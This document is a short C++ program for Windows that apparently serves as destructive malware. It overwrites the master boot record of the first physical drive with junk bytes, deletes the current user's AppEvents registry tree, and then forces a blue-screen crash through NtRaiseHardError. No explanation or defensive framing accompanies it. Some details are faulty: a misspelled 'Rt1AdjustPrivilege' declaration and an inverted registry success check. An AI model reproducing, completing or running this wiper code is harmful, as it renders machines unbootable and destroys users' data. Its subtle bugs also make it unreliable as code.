#include <Windows.h>

extern "C" NTSTATUS NTAPI Rt1AdjustPrivilege(ULONG Privilege, BOOLEAN Enable, BOOLEAN CurrentThread, PBOOLEAN OldValue);
extern "C" NTSTATUS NTAPI NtRaiseHardError(LONG ErrorStatus, ULONG NumberOfParameters, ULONG UnicodeStringParameterMask, PULONG_PTR Parameters, ULONG ValidResponseOptions, PULONG Response);

int main()
{
    bool use_bsod = true;
    DWORD bytes_read = 1024;
    char *mbr = new char[1024];
    HANDLE MasterBootRecord = CreateFileW(L"\\\\.\\PhysicalDrive0", GENERIC_ALL, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, OPEN_EXISTING, 0, 0);
    if (WriteFile(MasterBootRecord, mbr, 1024, &bytes_read, 0) == TRUE)
    {
        HKEY hKey = NULL;
        if (RegOpenKeyEx(HKEY_CURRENT_USER, L"AppEvents\\", NULL, DELETE | KEY_ENUMERATE_SUB_KEYS | KEY_QUERY_VALUE | KEY_SET_VALUE | KEY_WOW64_64KEY, &hKey))
        {
            if (RegDeleteTree(hKey, NULL) == ERROR_SUCCESS && use_bsod)
            {
                BOOLEAN bl;
                ULONG Response;
                Rt1AdjustPrivilege(19, TRUE, FALSE, &bl);
                NtRaiseHardError(STATUS_ASSERTION_FAILURE, NULL, NULL, NULL, 6, &Response);
            }
            RegCloseKey(hKey);
        }
    }
    CloseHandle(MasterBootRecord);
    return 0;
}
